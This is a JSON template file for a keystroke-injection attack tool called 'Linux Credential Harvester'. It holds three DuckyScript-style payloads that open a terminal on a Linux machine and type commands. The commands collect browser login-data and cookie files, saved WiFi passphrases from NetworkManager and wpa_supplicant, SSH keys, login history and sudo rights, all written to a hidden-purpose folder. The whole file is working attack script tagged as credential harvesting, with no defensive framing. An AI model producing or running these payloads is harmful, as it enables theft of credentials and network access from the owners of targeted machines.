{
  "metadata": {
    "name": "Linux Credential Harvester",
    "description": "Extracts stored credentials from Linux systems",
    "version": "1.0",
    "author": "Natasha AI"
  },
  "templates": [
    {
      "name": "Browser Credentials",
      "description": "Extracts credentials from Firefox and Chrome on Linux",
      "attack_type": "credential_harvest",
      "script": [
        "REM Linux Browser Credential Harvester",
        "REM Generated by Natasha AI",
        "DELAY 1000",
        "ALT F2",
        "DELAY 500",
        "STRING terminal",
        "DELAY 500",
        "ENTER",
        "DELAY 1000",
        "STRING mkdir -p ~/natasha_data",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;Browser Credentials Scan&quot; > ~/natasha_data/browser_creds.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;======================&quot; >> ~/natasha_data/browser_creds.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;\\nFirefox Profiles:&quot; >> ~/natasha_data/browser_creds.txt",
        "ENTER",
        "DELAY 300",
        "STRING if [ -d ~/.mozilla/firefox ]; then ls -la ~/.mozilla/firefox >> ~/natasha_data/browser_creds.txt; else echo &quot;Firefox profile directory not found&quot; >> ~/natasha_data/browser_creds.txt; fi",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nFirefox Login Data Files:&quot; >> ~/natasha_data/browser_creds.txt",
        "ENTER",
        "DELAY 300",
        "STRING find ~/.mozilla/firefox -name &quot;logins.json&quot; -o -name &quot;key4.db&quot; -o -name &quot;cert9.db&quot; | while read file; do echo &quot;$file exists&quot;; done >> ~/natasha_data/browser_creds.txt 2>/dev/null",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nChrome Data:&quot; >> ~/natasha_data/browser_creds.txt",
        "ENTER",
        "DELAY 300",
        "STRING if [ -d ~/.config/google-chrome ]; then echo &quot;Chrome directory found&quot; >> ~/natasha_data/browser_creds.txt; else echo &quot;Chrome directory not found&quot; >> ~/natasha_data/browser_creds.txt; fi",
        "ENTER",
        "DELAY 300",
        "STRING if [ -d ~/.config/google-chrome/Default ]; then ls -la ~/.config/google-chrome/Default | grep -E &quot;Login|Cookies&quot; >> ~/natasha_data/browser_creds.txt; fi",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nChromium Data:&quot; >> ~/natasha_data/browser_creds.txt",
        "ENTER",
        "DELAY 300",
        "STRING if [ -d ~/.config/chromium ]; then echo &quot;Chromium directory found&quot; >> ~/natasha_data/browser_creds.txt; else echo &quot;Chromium directory not found&quot; >> ~/natasha_data/browser_creds.txt; fi",
        "ENTER",
        "DELAY 300",
        "STRING if [ -d ~/.config/chromium/Default ]; then ls -la ~/.config/chromium/Default | grep -E &quot;Login|Cookies&quot; >> ~/natasha_data/browser_creds.txt; fi",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;Information saved to ~/natasha_data/browser_creds.txt&quot;",
        "ENTER",
        "DELAY 500",
        "STRING exit",
        "ENTER"
      ],
      "parameters": {
        "browser": "all",
        "exfil_method": "file"
      }
    },
    {
      "name": "WiFi Password Extractor",
      "description": "Extracts saved WiFi passwords from Linux",
      "attack_type": "credential_harvest",
      "script": [
        "REM Linux WiFi Password Extractor",
        "REM Generated by Natasha AI",
        "DELAY 1000",
        "ALT F2",
        "DELAY 500",
        "STRING terminal",
        "DELAY 500",
        "ENTER",
        "DELAY 1000",
        "STRING mkdir -p ~/natasha_data",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;WiFi Passwords&quot; > ~/natasha_data/wifi_passwords.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;=============&quot; >> ~/natasha_data/wifi_passwords.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;\\nNetworkManager Connections:&quot; >> ~/natasha_data/wifi_passwords.txt",
        "ENTER",
        "DELAY 300",
        "STRING if [ -d /etc/NetworkManager/system-connections ]; then",
        "ENTER",
        "DELAY 300",
        "STRING   echo &quot;NetworkManager connections found&quot; >> ~/natasha_data/wifi_passwords.txt",
        "ENTER",
        "DELAY 300",
        "STRING   ls -la /etc/NetworkManager/system-connections >> ~/natasha_data/wifi_passwords.txt 2>/dev/null",
        "ENTER",
        "DELAY 300",
        "STRING   echo &quot;\\nAttempting to extract passwords (may require sudo):&quot; >> ~/natasha_data/wifi_passwords.txt",
        "ENTER",
        "DELAY 300",
        "STRING   for file in /etc/NetworkManager/system-connections/*; do",
        "ENTER",
        "DELAY 300",
        "STRING     echo &quot;\\nConnection: $file&quot; >> ~/natasha_data/wifi_passwords.txt",
        "ENTER",
        "DELAY 300",
        "STRING     grep -E &quot;id=|ssid=|psk=&quot; &quot;$file&quot; >> ~/natasha_data/wifi_passwords.txt 2>/dev/null",
        "ENTER",
        "DELAY 300",
        "STRING   done",
        "ENTER",
        "DELAY 300",
        "STRING else",
        "ENTER",
        "DELAY 300",
        "STRING   echo &quot;NetworkManager connections directory not found&quot; >> ~/natasha_data/wifi_passwords.txt",
        "ENTER",
        "DELAY 300",
        "STRING fi",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nWPA Supplicant Configuration:&quot; >> ~/natasha_data/wifi_passwords.txt",
        "ENTER",
        "DELAY 300",
        "STRING if [ -f /etc/wpa_supplicant/wpa_supplicant.conf ]; then",
        "ENTER",
        "DELAY 300",
        "STRING   echo &quot;WPA supplicant configuration found&quot; >> ~/natasha_data/wifi_passwords.txt",
        "ENTER",
        "DELAY 300",
        "STRING   grep -E &quot;ssid=|psk=&quot; /etc/wpa_supplicant/wpa_supplicant.conf >> ~/natasha_data/wifi_passwords.txt 2>/dev/null",
        "ENTER",
        "DELAY 300",
        "STRING else",
        "ENTER",
        "DELAY 300",
        "STRING   echo &quot;WPA supplicant configuration not found&quot; >> ~/natasha_data/wifi_passwords.txt",
        "ENTER",
        "DELAY 300",
        "STRING fi",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;Information saved to ~/natasha_data/wifi_passwords.txt&quot;",
        "ENTER",
        "DELAY 500",
        "STRING exit",
        "ENTER"
      ],
      "parameters": {
        "credential_type": "wifi",
        "exfil_method": "file"
      }
    },
    {
      "name": "User Account Information",
      "description": "Extracts user account information and SSH keys",
      "attack_type": "credential_harvest",
      "script": [
        "REM Linux User Account Information Extractor",
        "REM Generated by Natasha AI",
        "DELAY 1000",
        "ALT F2",
        "DELAY 500",
        "STRING terminal",
        "DELAY 500",
        "ENTER",
        "DELAY 1000",
        "STRING mkdir -p ~/natasha_data",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;User Account Information&quot; > ~/natasha_data/user_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;======================&quot; >> ~/natasha_data/user_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING echo &quot;\\nCurrent User:&quot; >> ~/natasha_data/user_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING whoami >> ~/natasha_data/user_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING id >> ~/natasha_data/user_info.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nUser Login History:&quot; >> ~/natasha_data/user_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING last -10 >> ~/natasha_data/user_info.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nSSH Keys:&quot; >> ~/natasha_data/user_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING if [ -d ~/.ssh ]; then",
        "ENTER",
        "DELAY 300",
        "STRING   echo &quot;SSH directory found&quot; >> ~/natasha_data/user_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING   ls -la ~/.ssh >> ~/natasha_data/user_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING   if [ -f ~/.ssh/id_rsa.pub ]; then",
        "ENTER",
        "DELAY 300",
        "STRING     echo &quot;\\nPublic key:&quot; >> ~/natasha_data/user_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING     cat ~/.ssh/id_rsa.pub >> ~/natasha_data/user_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING   fi",
        "ENTER",
        "DELAY 300",
        "STRING   if [ -f ~/.ssh/authorized_keys ]; then",
        "ENTER",
        "DELAY 300",
        "STRING     echo &quot;\\nAuthorized keys:&quot; >> ~/natasha_data/user_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING     cat ~/.ssh/authorized_keys >> ~/natasha_data/user_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING   fi",
        "ENTER",
        "DELAY 300",
        "STRING else",
        "ENTER",
        "DELAY 300",
        "STRING   echo &quot;SSH directory not found&quot; >> ~/natasha_data/user_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING fi",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;\\nSudo Access:&quot; >> ~/natasha_data/user_info.txt",
        "ENTER",
        "DELAY 300",
        "STRING sudo -l >> ~/natasha_data/user_info.txt 2>/dev/null || echo &quot;No sudo access or requires password&quot; >> ~/natasha_data/user_info.txt",
        "ENTER",
        "DELAY 1000",
        "STRING echo &quot;Information saved to ~/natasha_data/user_info.txt&quot;",
        "ENTER",
        "DELAY 500",
        "STRING exit",
        "ENTER"
      ],
      "parameters": {
        "credential_type": "user",
        "exfil_method": "file"
      }
    }
  ]
}